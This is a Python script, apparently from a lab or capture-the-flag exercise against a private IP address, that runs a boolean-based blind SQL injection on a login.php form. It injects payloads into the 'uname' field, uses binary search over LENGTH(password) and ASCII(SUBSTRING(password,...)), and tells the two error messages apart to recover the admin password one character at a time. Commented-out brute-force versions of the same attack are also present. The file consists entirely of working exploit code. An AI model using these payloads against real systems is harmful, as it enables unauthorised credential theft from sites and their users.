import requests
# import sys
# yes = sys.argv[1]
i = 1
asciivalue = 1
answer = []


def binary_search_length(low, high):
    # Check base case
    if high > low:
        mid = (high + low) // 2
        payload = {
            "uname": "admin' AND (SELECT 'a' FROM user WHERE username='admin' AND LENGTH(password) > "+str(mid)+")='a", "pw": "1"}
        req = requests.post(
            'http://192.168.56.135:2009/login.php', data=payload)
        if("Invalid passwd" in req.text):
            return binary_search_length(mid+1, high)
        elif "Invalid username" in req.text:
            return binary_search_length(low, mid - 1)
    else:
        return low


# while True:
#     payload = {
#         "uname": "admin' AND (SELECT 'a' FROM user WHERE username='admin' AND LENGTH(password) > "+str(i)+")='a", "pw": "1"}
#     req = requests.post(
#         'http://192.168.56.135:2009/login.php', data=payload)
#     lengthtest = req.text
#     if "Invalid passwd" not in lengthtest:
#         length = i
#         break
#     else:
#         i = i+1
# print(i)


def bin(low, high, x, ans):
    if high >= low:
        mid = (high + low) // 2
        payload = {
            "uname": "admin' AND (SELECT ASCII(SUBSTRING(password," + str(x) + ",1)) FROM user WHERE username='admin')>'"+str(mid), "pw": "1"}
        req = requests.post(
            'http://192.168.56.135:2009/login.php', data=payload)
        if("Invalid passwd" in req.text):
            ans.append(mid)
            return bin(mid+1, high, x, ans)
        elif "Invalid username" in req.text:
            return bin(low, mid - 1, x, ans)
    else:
        return max(ans)


for x in range(1, 33):
    ans = []
    answer.append(chr(bin(1, 126, x, ans)+1))
print("Recovered String: " + ''.join(answer))


# for x in range(1, binary_search_length(1, 100)):
#     while asciivalue < 126:
#         payload = {
#             "uname": "admin\' AND (SELECT SUBSTRING(password," + str(x) + ",1) FROM user WHERE username='admin')='"+chr(asciivalue), "pw": "1"}
#         req = requests.post(
#             'http://192.168.56.135:2009/login.php', data=payload)
#         if "Invalid passwd" in req.text:
#             answer.append(chr(asciivalue))
#             break
#         else:
#             asciivalue = asciivalue + 1
#         pass
#     asciivalue = 0
# print("Recovered String: " + ''.join(answer))
